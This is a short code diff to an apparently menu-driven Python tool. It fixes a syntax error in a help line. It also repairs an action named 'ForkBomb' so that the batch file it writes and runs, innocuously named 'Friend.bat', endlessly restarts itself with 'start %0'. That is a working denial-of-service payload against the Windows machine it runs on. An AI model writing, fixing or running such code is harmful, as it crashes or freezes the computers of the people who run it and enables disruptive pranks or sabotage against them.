@@ -148,7 +148,7 @@ while True:
     sleep(0.1)
     print("exit) To exit the program")
     sleep(0.1)
-    print("info) Shows details of a chosen command
+    print("info) Shows details of a chosen command")
     print(" ")
     sleep(0.1)
     print("help) Show available actions")
@@ -850,7 +850,7 @@ if action == "ForkBomb":
     run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
     run_ps('Set-Content -Path "Friend.bat" -Value "@echo off"')
     run_ps('Add-Content -Path "Friend.bat" -Value ":A"')
-    run_ps('Add-Content -Path "Friend.bat" -Value "0%|0%"')
+    run_ps('Add-Content -Path "Friend.bat" -Value "start %0"')
     run_ps('Add-Content -Path "Friend.bat" -Value "goto A"')
     
     # Execute it
